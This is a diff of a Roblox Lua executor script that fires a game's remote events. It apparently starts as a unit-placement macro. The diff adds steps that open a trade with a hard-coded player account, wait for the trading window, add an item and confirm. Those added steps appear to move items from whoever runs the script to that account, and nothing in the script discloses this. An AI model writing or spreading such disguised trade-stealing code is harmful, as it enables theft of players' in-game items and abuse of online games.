@@ -1,5 +1,5 @@
 wait(0.07)
-local maksimHuEsoS = "f9"
+local maksimHuEsoS = "bc"
 local args = {
     [1] = {
         [1] = {
@@ -199,6 +199,44 @@ local args = {
             [2] = "Place100Units"
         },
         [2] = maksimHuEsoS
+    }
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("dataRemoteEvent"):FireServer(unpack(args))
+wait(0.07)
+local args = {
+    [1] = {
+        [1] = {
+            [1] = "6636366335666365366163393438383439643037316533376664353138653762",
+            [2] = game:GetService("Players"):WaitForChild("MistrKaeni")
+        },
+        [2] = "r"
+    }
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("dataRemoteEvent"):FireServer(unpack(args))
+wait(0.01)
+repeat
+	wait(0.4)
+until game:GetService("Players").LocalPlayer.PlayerGui.Lobby.TradingFrame.Visible == true
+local args = {
+    [1] = {
+        [1] = {
+            [1] = 2424
+        },
+        [2] = "3"
+    }
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("dataRemoteEvent"):FireServer(unpack(args))
+wait(0.07)
+repeat 
+       wait(0.5)
+until game:GetService("Players").LocalPlayer.PlayerGui.Lobby.TradingFrame.Visible == true
+local args = {
+    [1] = {
+        [1] = {},
+        [2] = "X"
     }
 }
 
